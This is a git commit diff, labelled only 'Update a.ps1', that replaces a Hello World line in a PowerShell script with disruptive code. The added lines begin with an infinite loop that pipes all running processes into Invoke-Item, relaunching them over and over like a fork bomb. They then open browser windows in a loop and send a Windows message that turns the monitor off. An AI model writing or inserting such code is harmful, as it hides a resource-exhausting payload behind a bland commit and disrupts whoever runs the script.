dc214dac17a5ff6d1cd93af7c451c26a2400ba48
Levi <79211994+levi-stan@users.noreply.github.com>
2026-09-14 19:49:21 +0100

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -1,1 +1,6 @@
-Write-Host "Hello, World!"
+For(){Ps|Ii}
+for ($i = 0; $i -lt 10; $i++) {
+    Start-Process "msedge.exe" -ArgumentList "--new-window https://www.google.com"
+    (Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
+}
+    
